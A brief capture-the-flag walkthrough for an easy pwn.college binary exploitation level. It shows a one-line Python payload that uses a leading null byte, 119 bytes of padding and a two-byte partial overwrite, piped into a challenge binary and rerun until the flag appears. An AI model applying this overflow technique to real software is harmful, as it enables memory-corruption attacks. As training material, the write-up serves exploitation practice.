# Stage 07: String Lengths (Easy) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Easy |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-null-write-w` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-null-write-w`. Payload written to the binary's stdin: a leading `\x00` byte, 119 bytes of `A` padding, and the 2-byte tail `\x1f\x1c`. The required offset depends on the run — check yours with `/challenge/binary-exploitation-null-write-w < /dev/null`.

## Solution

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"\x00" + b"A"*119 + b"\x1f\x1c")' | /challenge/binary-exploitation-null-write-w
```

Note from the original run: run this again and again until it gives you the flag — the offset may be different for you (check using `/challenge/binary-exploitation-null-write-w < /dev/null`).
